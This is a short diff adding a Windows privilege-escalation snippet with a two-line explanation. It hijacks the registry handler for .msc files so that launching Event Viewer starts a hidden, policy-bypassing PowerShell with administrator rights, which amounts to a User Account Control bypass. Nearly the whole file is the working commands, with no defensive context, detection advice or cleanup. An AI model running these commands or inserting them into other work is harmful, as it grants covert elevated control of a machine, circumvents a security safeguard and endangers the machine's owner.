@@ -1,0 +1,5 @@
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Sta -NonI -W Hidden -Exec Bypass -C Start-Process powershell -Verb runAs" /f
+start eventvwr
+
+Modifies the registry key for mscfile, which controls .msc files (like Event Viewer).
+When eventvwr.exe is launched, it will start PowerShell as admin.
